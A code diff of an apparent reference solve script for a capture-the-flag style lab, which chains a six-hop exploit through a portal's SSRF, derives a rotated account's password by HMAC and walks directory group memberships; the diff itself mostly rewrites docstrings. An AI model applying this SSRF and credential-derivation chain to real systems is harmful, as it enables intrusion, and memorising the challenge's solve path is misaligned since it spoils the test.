@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
-"""F2 BLIND reference solve (Stage-2). Starts from ONLY the portal URL and discovers EVERYTHING from
-served evidence — the rotated account, the nested-group graph + winning path, the honored federation
-claim namespace + tag + value, the IAM escalation family, and every role/resource/action name — with
-NO hardcoded instance facts. Works on the fixed Stage-1 instance AND on any generated seed, so it is
-both the reference solve (proves solvability) and the blind-solve check the roadmap's P1 exit needs.
+"""F2 schema-aware reference solve (Stage-2). Starts from the portal URL and discovers every generated
+instance fact from served evidence: the rotated account, nested-group path, federation claim/tag/value,
+IAM escalation family, and role/resource/action names. It intentionally knows the task's endpoint and
+payload schemas, so it proves reachability across generated instances rather than interface discovery.
 
 All internal hops go through the portal's constrained SSRF. `solve(base)` returns the recovered
 terminal flag and echoes each per-run stage marker (§6.3); run as a script it prints them. Also
@@ -26,7 +25,7 @@ class SolveError(Exception):
 
 
 def solve(base: str, echo=print, state: dict = None) -> str:
-    """Discover-and-chain the full 6-hop exploit from only `base` (the portal). Returns the terminal
+    """Discover generated facts and chain the full 6-hop exploit from `base`. Returns the terminal
     flag; `echo` receives each stage marker as it is recovered. If `state` (a dict) is passed, it is
     populated with the artifact each hop hands the next (account, pw, hosts, entitlement, granted_role,
     sessions, family, roles/actions, blob, data_key) — used by hop_state.py to seed isolated-hop
@@ -80,7 +79,6 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     # ---- hop 2: credential ---------------------------------------------------------------------
     ssrf(f"{CI}/pipeline/config")  # observe the honeytoken; do not use it
     policy = ssrf(f"{CI}/rotation/policy")
-    marker(policy)
     account, seed = policy["account"], policy["rotation_seed"]
     pw = f"{account}-" + hmac.new(seed.encode(), account.encode(), hashlib.sha256).hexdigest()[:12]
     st.update(account=account, password=pw)
@@ -89,6 +87,7 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     bind = ssrf(f"{DIR}/dir/bind?cred={account}:{pw}")
     if "member_of" not in bind:
         raise SolveError(f"bind failed: {bind}")
+    marker(bind)
     seen, stack, winning, entitlement, owner_team = set(), list(bind["member_of"]), None, None, None
     while stack:
         g = stack.pop()
